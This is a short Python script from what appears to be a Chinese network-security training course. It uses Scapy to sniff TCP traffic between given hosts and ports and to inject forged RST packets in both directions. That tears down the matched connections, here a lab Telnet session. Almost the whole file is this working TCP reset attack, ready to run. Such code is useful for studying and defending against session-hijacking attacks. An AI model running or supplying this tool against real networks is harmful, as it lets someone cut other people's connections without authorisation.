#!/usr/bin/env python3
# -*- coding=utf-8 -*-
# 本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
# 教主QQ:605658506
# 亁颐堂官网www.qytang.com
# 教主技术进化论拓展你的技术新边疆
# https://ke.qq.com/course/271956?tuin=24199d8a

import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # 清除报错
from scapy.all import *


def tcp_monitor_callback(pkt):
    source_mac = pkt[Ether].fields['src']
    destination_mac = pkt[Ether].fields['dst']
    source_ip = pkt[IP].fields['src']
    destination_ip = pkt[IP].fields['dst']
    source_port = pkt[TCP].fields['sport']
    destination_port = pkt[TCP].fields['dport']
    seq_sn = pkt[TCP].fields['seq']
    ack_sn = pkt[TCP].fields['ack']

    a = Ether(src=source_mac, dst=destination_mac) / IP(src=source_ip, dst=destination_ip) / TCP(dport=destination_port,
                                                                                                 sport=source_port,
                                                                                                 flags=4, seq=seq_sn)
    b = Ether(src=destination_mac, dst=source_mac) / IP(src=destination_ip, dst=source_ip) / TCP(dport=source_port,
                                                                                                 sport=destination_port,
                                                                                                 flags=4, seq=ack_sn)
    sendp(a, iface='ens33', verbose=False)
    sendp(b, iface='ens33', verbose=False)


def tcp_reset(src_ip, dst_ip, dst_port, src_port=None):
    if src_port is None:
        match = "src host " + src_ip + " and dst host " + dst_ip + " and dst port " + dst_port
    else:
        match = "src host " + src_ip + " and dst host " + dst_ip + " and src port " + src_port + " and dst port " + dst_port
    print(match)
    sniff(prn=tcp_monitor_callback, filter=match, store=0, iface='ens33')


if __name__ == "__main__":
    tcp_reset('10.1.1.100', '10.1.1.253', '23')
